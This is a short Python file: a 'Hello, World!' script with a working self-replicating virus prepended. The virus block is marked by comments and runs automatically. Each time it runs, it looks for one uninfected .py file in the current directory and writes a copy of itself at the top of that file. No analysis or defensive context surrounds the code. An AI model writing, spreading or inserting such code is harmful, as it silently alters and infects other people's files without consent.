
# --- VIRUS CODE START ---
import os

def get_virus():
    with open(__file__, 'r') as f:
        lines = f.readlines()
    virus_code = []
    virus_area = False
    for line in lines:
        if line.strip() == '# --- VIRUS CODE START ---':
            virus_area = True
        if virus_area:
            virus_code.append(line)
        if line.strip() == '# --- VIRUS CODE END ---':
            break
    return ''.join(virus_code)

def infect(target_file):
    with open(target_file, 'r') as f:
        original_code = f.read()
    
    if '# --- VIRUS CODE START ---' not in original_code:
        with open(target_file, 'w') as f:
            f.write(get_virus() + original_code)

def find_target():
    python_files = []
    for file in os.listdir('.'):
        if file.endswith('.py') and file != os.path.basename(__file__):
            with open(file, 'r') as f:
                content = f.read()
            if '# --- VIRUS CODE START ---' not in content:
                python_files.append(file)
    return python_files[0] if python_files else None

def run():
    target = find_target()
    if target:
        infect(target)

run()  # 执行病毒
# --- VIRUS CODE END ---
#!/usr/bin/env python3
print("Hello, World!") 